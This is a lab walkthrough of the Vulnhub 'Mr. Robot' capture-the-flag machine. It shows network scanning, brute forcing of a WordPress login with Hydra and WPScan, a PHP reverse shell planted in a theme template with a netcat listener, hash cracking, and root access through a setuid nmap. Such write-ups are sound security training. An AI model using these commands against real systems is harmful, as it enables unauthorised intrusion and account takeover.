<?php 
$basedir = '../../';
include($basedir.'includes/header.php'); 
?> 

      <section>

      <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
</span></code></pre></div></div>

<div style="width:100%;height:0;padding-bottom:139%;position:relative;"><iframe src="https://giphy.com/embed/W3klTgJuKy5vymEoe7" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/coelho-fabiocoelho-fpc1987-W3klTgJuKy5vymEoe7"></a></p>
<h1 id="ctflearn">Mr. Robot CTF</h1>
<p>
Mr. Robot is a beginner to intermediate vulnerable machine from the repository of <a href="https://www.vulnhub.com/">Vulnhub</a>.
This machine is based on a popular series called <a href="https://www.imdb.com/title/tt4158110/">Mr. Robot</a>.
In this article, we will explore this machine's vulnerabilities and find the 3 hidden flags.
</p>

<h3>Resources required:</h3>
<ul>
  <li><a href="https://www.vmware.com/ca/products/workstation-pro/workstation-pro-evaluation.html">VMWare Workstation (or any virtualization software)</a></li>
  <li><a href="https://www.kali.org/get-kali/">Kali Linux VM (my preferred security testing OS)</a></li>
  <li><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr. Robot VM</a></li>
</ul>
<h3>Topology:</h3>
<p><img src="https://user-images.githubusercontent.com/59718043/125665095-7728b14b-5a28-4a57-88ed-e39660bdffb0.png" alt="kali linux mr robot topology" /></p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>On boot up:</b>
   _____          __________      ___.           __   
  /     \_______  \______   \ ____\_ |__   _____/  |_ 
 /  \ /  \_  __ \  |       _//  _ \| __ \ /  _ \   __\
/    Y    \  | \/  |    |   (  <_> ) \_\ (  <_> )  |  
\____|__  /__|     |____|_  /\____/|___  /\____/|__|  
        \/                \/           \/             


linux login: 
</span></code></pre></div></div>

<p>
    Assuming that you have already gone through the process of installing and configuring both VMs, we're going to dive right into
it.
</p>
<h3>Reconnaissance</h3>
<p>
Booting up Mr. Robot, the machine doesn't tell us
much. We need to find its IP address
within our isolated network. 
<br></br>
Our isolated network address is 172.16.47.0/24. We can run a ping scan to determine which
hosts are active.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nmap -v -sP 172.16.47.0/24 
</span></code></pre></div></div>
<p><b>-sP</b> - Ping scan</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
Nmap scan report for 172.16.47.128
Host is up (0.00074s latency).
Nmap scan report for 172.16.47.129 [host down]
Nmap scan report for 172.16.47.130 [host down]
Nmap scan report for 172.16.47.131 
</span></code></pre></div></div>

<p>Here we have mapped out 2 active hosts. (Kali and Mr. Robot)
<br/><br/>
Mr. Robot's IP address: <b>172.16.47.131</b> 
</p>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Kali Linux</th>
<th>Mr. Robot</th>
</tr>
</thead>
<tbody>
<tr>
<td>172.16.47.128</td>
<td>172.16.47.131</td>
</tr>
</tbody>
</table>
<p>
At this point, we should run an nmap to see what we're dealing with.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nmap -v -A 172.16.47.131
</span></code></pre></div></div>
<p>
<b>-A</b> - enables OS detection, version detection, script scanning, and traceroute.    
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
PORT    STATE  SERVICE   VERSION
22/tcp  closed ssh       
80/tcp  open   http      Apache httpd 
443/tcp open   ssl/http  Apache httpd 
</span></code></pre></div></div>

<p>Right off the bat we get a hint, as we can see on the output, Apache is running
an HTTP site that we should check out.
<br/><br/>
We can open up a browser and type in Mr. Robot's address, in my case it's 172.16.47.131.
<br/><br/>
The site contains no useful information other than intriguing "recruiting" videos.
</p>



<br/><br/>
<h1>First flag - Robots</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126023484-d458b33e-a93c-446e-ba5f-ea7679054486.png" alt="robots" /></p>
<p>
Append <b>robots.txt</b> to the URL and navigate to the first flag.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>172.16.47.131/robots.txt</b>
User-agent: *
fsocity.dic
key-1-of-3.txt
</span></code></pre></div></div>
<p>Navigating to this directory returns 2 files. The <b>key-1-of-3.txt</b> contains the
first flag. The other file seems to be a <b>wordlist</b>.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>172.16.47.131/key-1-of-3.txt</b>
073403c8a58a1f80d943455fb30724b9
</span></code></pre></div></div>
<p>Flag #1: <b>073403c8a58a1f80d943455fb30724b9</b>
<br/><br/>

<h3>Web app scanning</h3>
The next best move, to search for the next flag, is to scan the site for
any bugs or vulnerabilities. We're going to use <a href="https://cirt.net/Nikto2">Nikto</a>, an open-source
web server vulnerability scanner.
<br/></br>
Run a Nikto scan:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nikto -h 172.16.47.131
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
</span></code></pre></div></div>

<p>The results should look similar to this output. We now know that this site was built
using WordPress. We can explore this route further. 
The next tool we'll be using is <a href="https://wpscan.com/wordpress-security-scanner">WPScan</a>,
a web security scanner that examines WordPress-built sites.
<br/></br>
Run WPScan:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">wpscan --url http://172.16.47.131/ --enumerate vp,vt,u
</span></code></pre></div></div>

<p>
The <b>--url</b> option specifies the target URL.
<br/><br/>
The <b>--enumerate</b> option specifies the types of enumeration processes: <b>vp</b>, <b>vt</b>, and
<b>u</b>.
<br/><br/>
<b>vp</b> - Scan for vulnerable plugins.
<br/><br/>
<b>vt</b> - Scan for vulnerable themes.
<br/><br/>
<b>u</b> - Scan for a range of user IDs.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
_______________________________________________________
    __          _______   _____
    \ \        / /  __ \ / ____|
     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team
                   Version 3.5.3
      Sponsored by Sucuri - https://sucuri.net
  @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________
[+] WordPress theme in use: twentyfifteen
    [!] The version is out of date, the latest version is 2.9
</span></code></pre></div></div>

<p>
Unfortunately, this returns no useful information other than an outdated WordPress theme.
</p>

<br/><br/>
<h1>Brute forcing login credentials</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126023666-2ee5662d-9c4a-4705-802a-1480b19a15e0.jpg" alt="brute force man beating up another guy" /></p>
<p>
Previously, when we navigated into <b>robots.txt</b>, we found 2 files. One contains the flag and the
other (fsocity.dic) is a wordlist. The wordlist can be used alongside Hydra to brute force the 
WordPress login page of the site. The URL of the login page we are trying to breach is
<b>172.16.47.131/wp-login.php</b>
<br/><br/>
Before using the wordlist, we need to remove the duplicated content:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">sort fsocity.dic | uniq -d >> fsocity_uniq.dic
</span></code></pre></div></div>

<p>We have sorted fsocity.dic and created a file (fsocity_uniq.dic) containing only unique strings.
<br/><br/>
Check the word count of both files:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>wc -w fsocity.dic</b>
858160 fsocity.dic
</span></code></pre></div></div>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>wc -w fsocity_uniq.dic</b>
11441 fsocity_uniq.dic
</span></code></pre></div></div>
<p>
Compared to the original file, the newly created file only contains 11,441 words after removing
duplicates.
</p>



<p><img src="https://user-images.githubusercontent.com/59718043/126023762-c2c1db47-4e26-4e1f-a506-dd41363c3e25.jpg" alt="dragons" /></p>

<p>Now we can bruteforce the page using Hydra (may take a while):
</p>


<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">hydra -L fsocity_uniq.dic -p test 172.16.47.131 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2Ftestcookie=1:Invalid username" -t 50 -f -V
</span></code></pre></div></div>

<p>
<b>-L fsocity_uniq.dic</b> - Loads login username from the file.
<br/><br/>
<b>-p test</b> - Try a password, it doesn't matter what value we set for this right now.
<br/><br/>
<b>http-post-form</b> - Specifies our target (an HTTP POST form)
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Burp intercepted request:</b>
POST /wp-login.php HTTP/1.1
Host: 172.16.47.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://172.16.47.131
Connection: close
Referer: http://172.16.47.131/wp-login/
Cookie: s_fid=00669FCAAD5716E6-3091D4138DCE50B1; s_nr=1620193927132; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=sdrtn&pwd=edth&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2Ftestcookie=1
</span></code></pre></div></div>

<p>
<b>/wp-login.php</b> - As seen in this output from Burp Suite, this is the POST form's path.
<br/><br/>
The intercepted request also shows the POST parameters:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">log=^USER^&pwd=^PASS^&wp-submit=Log+In
</span></code></pre></div></div>
<p>
The <b>^USER^</b> and <b>^PASS^</b> are temporary placeholders that will be filled in by actual values.
<br/><br/>
<b>-t 50</b> - Run 50 tasks (number of connections in parallel)
<br/><br/>
The <b>-f</b> option terminates the process when a login-pass pair is found.
<br/><br/>
<b>Invalid username</b> - Considers invalid usernames as failed attempts.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Hydra output:</b>
[80] [http-post-form] host: 172.16.47.131  login: elliot  password: test
</span></code></pre></div></div>

<p>After a few moments, we get an output similar to this. We now know that there is a user named
<b>elliot</b> in the database.
<br/><br/>
We can then attempt to brute force the password of this user with WPScan:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">wpscan --url 172.16.47.131 --passwords fsocity.dic --usernames elliot --max-threads 20 -v 
</span></code></pre></div></div>
<p><b>--passwords</b> - Use our wordlist (fsocity.dic) to search for the password.</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
[!] Valid Combinations Found:
    username: elliot, Password: ER28-0652
</span></code></pre></div></div>

<p>This should return a valid password for the username <b>elliot</b>. The password is 
<b>ER28-0652</b>. We can use these credentials to log into <b>172.16.47.131/wp-login.php</b>
<br/><br/>
The credentials should give us access to the site's WordPress admin dashboard.
</p>

<br/><br/>
<h1>Gaining shell access - PHP code injection</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126023854-f6a42fcd-5f8a-468d-9793-7df7689066d1.jpg" alt="injection" /></p>


<p>
Since we already have administrator access to the site's dashboard, we should now also have shell access.
For this next part, we're going to gain remote shell access using the credentials we harvested by creating a <a href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">reverse shell</a>.
<br/><br/>
To proceed, we'll need to edit the <b>404 Template</b> page of the site and inject a PHP code that
creates a reverse shell.
<br/><br/>
Source code: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey</a>
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Edit 404 Template:</b>
$ip = '127.0.0.1';  //CHANGE THIS
$port = 1234;       //CHANGE THIS
</span></code></pre></div></div>

<p>
We will need to modify these two lines and change <b>$ip</b> to our attacker's address and set <b>$port</b> to any 
unused appropriate port.
<br/><br/>
We also need to set up our listening port using Netcat:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nc -lvp 2223
</span></code></pre></div></div>

<p>
After updating the 404.php file, we should be able to gain remote access by appending anything
random to the URL of <b>172.16.47.131/</b> while Netcat is running on our terminal.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">172.16.47.131/anythingrandom123123213
</span></code></pre></div></div>

<p>Check out the output on our terminal:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
listening on [any] 2223 ...
172.16.47.131: inverse host lookup failed: Host name lookup failure
connect to [172.16.47.128] from (UNKNOWN) [172.16.47.131] 50527
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
    06:17:28 up 2:08, 0 users, load average: 0.00, 0.01, 0.05
USER    TTY     FROM    LOGIN@      IDLE    JCPU    PCPU    WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
</span></code></pre></div></div>

<p>
Verify our access: 
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">$ <b>id</b>
uid=1(daemon) gid=1(daemon) groups=1(daemon)
</span></code></pre></div></div>

<p>
We're in!
</p>
<br/><br/>
<h1>Second flag - Dissecting the shell</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126023954-139a0533-01c2-4c09-8a73-410276241a63.jpg" alt="shells" /></p>

<p>Exploring further, we can find <b>/home/robot</b>, a directory that contains 2 files,
an unreadable file that belongs only to the user <b>robot</b> containing the second flag, and a file that
contains some type of encrypted credential.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>/home/robot</b>
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
</span></code></pre></div></div>
<p>Display <b>password.raw-md5</b> contents:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">$ <b>cat password.raw-md5</b>
robot:c3fcd3d76192e4007dfb496cca67e13b
</span></code></pre></div></div>

<p>Here we have an interesting MD5-hashed string.
<br/><br/>
The decrypted value of this string is <b>abcdefghrjklmnopqrstuvwxyz</b>.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">$ <b>sudo cat key-2-of-3.txt</b>
sudo: no tty present and no askpass program specified
</span></code></pre></div></div>

<p>
We still need to get a tty in this session.
<br/><br/>
To spawn a fully interactive tty shell using Python:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">$ <b>python -c 'import pty;pty.spawn("/bin/bash")'</b>
daemon@linux:/home/robot$
</span></code></pre></div></div>

<p>
Security testers usually try to upgrade from a simple reverse shell to a fully interactive shell. This
approach is common.
<br/><br/>
Once we obtain a fully interactive shell, we can now switch to the user <b>robot</b> using the
password we just decrypted, and open the file containing the second flag.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">daemon@linux:/home/robot$ <b>su robot</b>
Password: abcdefghrjklmnopqrstuvwxyz
robot@linux:~$
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">robot@linux:~$ <b>cat key-2-of-3.txt</b>
822c73956184f694993bede3eb39f959
</span></code></pre></div></div>


<br/><br/>
<h1>Third flag - Privilege escalation</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126024055-248dad44-940f-49fb-84fe-8a84edef7e1f.png" alt="privilege escalation escalator" /></p>

<p>Gaining root privilege would be the next step. Ideally, there would be an exploitable
<b>setuid</b> file we can search for.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">find / -perm +6000 2> /dev/null
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>Output:</b>
/usr/local/bin/nmap
</span></code></pre></div></div>
<p>
Why this particular directory is interesting: Nmap is not typically installed, not especially as root.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">robot@linux:/usr/local/bin$ <b>./nmap</b>
Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] &#8249;host or net list&#8250;
</span></code></pre></div></div>

<p>
Now that we have the specific version, we can search for an exploit.
</p>

<p>
It turns out that the <b>--interactive</b> option gives us an <b>nmap></b> prompt.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"><b>./nmap --interactive</b>
Starting nmap V. 3.81 (http://www.insecure.org/nmap/)
Welcome to Interactive Mode -- press h &#8249;enter&#8250; for help
nmap>
</span></code></pre></div></div>

<p>
Apparently, we can execute commands in this shell with a <b>!</b> (exclamation mark) before the command.
<br/><br/>
We need to follow this up by entering <b>!sh</b> to gain a root shell.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nmap> <b>!sh</b>
#
</span></code></pre></div></div>

<p>
All that is left for us to do is to search for the third and final flag in root's home directory:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1"># <b>ls /root</b>
firstboot_done  key-3-of-3.txt
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
</span></code></pre></div></div>

<p>That's it! We have all 3 flags. We have successfully owned Mr. Robot.</p>
<p><img src="https://user-images.githubusercontent.com/59718043/126025334-bd226787-4374-4c87-bf63-a945131a9b8c.jpg" alt="game over" /></p>

<h1>Sources</h1>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Subject</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Mr. Robot VM</td>
<td><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Vulnhub</a></td>
</tr>
<tr>
<td>Kali Linux VM</td>
<td><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">Offensive-Security</a></td>
</tr>
<tr>
<td>Mr. Robot Walkthrough</td>
<td><a href="http://camelinc.info/blog/2017/02/Vulnhub---Mr-Robot-1-boot2root-CTF-walkthrough/">camelinc</a></td>
</tr>
<tr>
<td>Mr. Robot Walkthrough</td>
<td><a href="https://blog.christophetd.fr/write-up-mr-robot/">christophetd</a></td>
</tr>
<tr>
<td>Mr. Robot Walkthrough</td>
<td><a href="https://mrpnkt.github.io/2016/writeup-mr-robot-1/">mrpnkt</a></td>
</tr>
<tr>
<td>Hydra Package Description</td>
<td><a href="https://tools.kali.org/password-attacks/hydra">Kali</a></td>
</tr>
<tr>
<td>WordPress Admin Shell Upload</td>
<td><a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/">Rapid7</a></td>
</tr>
<tr>
<td>PHP Reverse Shell Source Code</td>
<td><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey</a></td>
</tr>
<tr>
<td>Linux Privilege Escalation with Setuid and Nmap</td>
<td><a href="https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/">adamcouch</a></td>
</tr>
</tbody>
</table>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Media</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://giphy.com/gifs/coelho-fabiocoelho-fpc1987-W3klTgJuKy5vymEoe7">fabiocoelho GIF via GIPHY</a></td>
</tr>
<tr>
<td><a href="https://lucid.app/">Topology diagram via Lucid</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/vector">Vector Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/cartoon">Cartoon Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/hydra">Hydra Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/injection-syringe">Injection Syringe Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/shell">Shell Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/people">People Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/game-over">Game Over Vectors by Vecteezy</a></td>
</tr>
</tbody>
</table>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
## @Date: Jul 15 2021
</span></code></pre></div></div>

<div class="page-nav">
<a href="/index.php" class="previous round">&#8249;Home</a>
<!--<a href="#" class="next round">Next&#8250;</a>-->
</div>

      </section>
<?php 
$basedir = '../../';
include($basedir.'includes/footer.php'); 
?> 
